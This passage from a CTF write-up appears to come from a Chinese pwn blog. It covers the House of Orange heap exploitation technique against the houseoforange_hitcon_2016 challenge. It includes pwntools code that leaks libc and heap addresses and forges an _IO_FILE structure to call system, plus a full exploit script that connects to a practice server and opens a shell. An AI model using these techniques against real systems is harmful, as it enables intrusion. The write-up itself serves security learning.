<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x400, <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)</span></span><br>libc<span class="hljs-selector-class">.address</span> = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x7f'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x3c5188<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc.address'</span>,libc.address)</span></span><br>io_list_all = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'_IO_list_all'</span>]</span><br>system = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p>
<figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br>edit<span class="hljs-comment">(0x10, payload)</span><br>show<span class="hljs-comment">()</span><br>ru<span class="hljs-comment">('b'*0x10)</span><br>heap = u<span class="hljs-number">64</span><span class="hljs-comment">(sh.recvuntil('\n')</span>.strip<span class="hljs-comment">()</span>.ljust<span class="hljs-comment">(8, '\x00')</span>)<br>heap_base = heap - <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br>lg<span class="hljs-comment">('heap_base',heap_base)</span><br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake-file"></a>构造fake_file</h3>
<p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p>
<p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p>
<figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gcode">dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">400</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(1)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span><br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(0x61)</span><span class="hljs-attr">#to small bin</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(io_list_all-0x10)</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(1)</span><span class="hljs-attr">#_IO_write_base &lt; _IO_write_ptr</span><br><span class="hljs-attr">fake_file = fake_file.ljust(0</span>xc<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>)<br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">3</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(heap_base+0x5E8)</span> <span class="hljs-attr">#vtable ptr</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(system)</span><br>payload += fake_file<br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure>
<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>
修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"Your choice : "</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import  *<br> <br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,<span class="hljs-built_in">debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26188) #连接远程程序<br>elf = ELF(binary)     <br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]<br>one_gadget[0] = 0x45216<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims  :sh.recvuntil(delims )<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-attribute">lg</span>=lambda address,data<span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br>def <span class="hljs-built_in">add</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br>def show():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br>def <span class="hljs-built_in">edit</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br><br><span class="hljs-built_in">add</span>(0x30,<span class="hljs-string">'aaaa\n'</span>)<br><span class="hljs-comment">#dbg()</span><br>payload = <span class="hljs-string">'a'</span> * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)<br> <br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x1000, <span class="hljs-string">'a\n'</span>)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x400, <span class="hljs-string">'a'</span> * 8)<br><span class="hljs-comment">#dbg()</span><br>show()<br>ru(<span class="hljs-string">'a'</span><span class="hljs-number">*8</span>)<br>libc.address = u64(ru(<span class="hljs-string">'\x7f'</span>).ljust(8, <span class="hljs-string">'\x00'</span>)) - 0x3c5188<br>lg(<span class="hljs-string">'libc.address'</span>,libc.address)<br>  <br>io_list_all = libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc.symbols[<span class="hljs-string">'system'</span>]<br><br>payload = <span class="hljs-string">'b'</span> * 0x10<br> <br><br><span class="hljs-built_in">edit</span>(0x10, payload)<br><br>show()<br>ru(<span class="hljs-string">'b'</span><span class="hljs-number">*0</span>x10)<br>heap = u64(sh.recvuntil(<span class="hljs-string">'\n'</span>).strip().ljust(8, <span class="hljs-string">'\x00'</span>))<br>heap_base = heap - 0xE0<br>lg(<span class="hljs-string">'heap_base'</span>,heap_base)<br><span class="hljs-comment">#dbg()</span><br> <br>payload = <span class="hljs-string">'a'</span> * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)<br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p64(0x61)#<span class="hljs-keyword">to</span> small bin<br>fake_file += p64(0)+p64(io_list_all-0x10)<br>fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr<br>fake_file = fake_file.ljust(0xc0,<span class="hljs-string">'\x00'</span>)<br>fake_file += p64(0) * 3<br>fake_file += p64(heap_base+0x5E8) #vtable ptr<br>fake_file += p64(0) * 2<br>fake_file += p64(system)<br>payload += fake_file<br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br> <br>ru(<span class="hljs-string">"Your choice : "</span>)<br>sl(<span class="hljs-string">'1'</span>)<br><br>itr()<br></code></pre></td></tr></tbody></table></figure>
<p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<blockquote>
<p>参考文章<br>
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Spirit/">← Next House of Spirit</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Storm/">House of Storm Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">House of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E4%BC%AA%E9%80%A0top-chunk-size%E6%97%B6%EF%BC%8C%E5%BF%85%E9%A1%BB%E6%BB%A1%E8%B6%B3%E4%BB%A5%E4%B8%8B%E8%A6%81%E6%B1%82"><span class="toc-number">1.3.1.</span> <span class="toc-text">注意：伪造top chunk size时，必须满足以下要求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#houseoforange-hitcon-2016"><span class="toc-number">2.1.</span> <span class="toc-text">houseoforange_hitcon_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.6.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">2.7.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9top-chunk"><span class="toc-number">2.7.1.</span> <span class="toc-text">修改top chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%A4%A7%E4%BA%8Etop-chunk%E7%9A%84chunk%EF%BC%8C%E8%BF%9B%E5%85%A5unsortedbin"><span class="toc-number">2.7.2.</span> <span class="toc-text">申请大于top chunk的chunk，进入unsortedbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap"><span class="toc-number">2.7.3.</span> <span class="toc-text">泄露libc和heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0fake-file"><span class="toc-number">2.7.4.</span> <span class="toc-text">构造fake_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.7.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>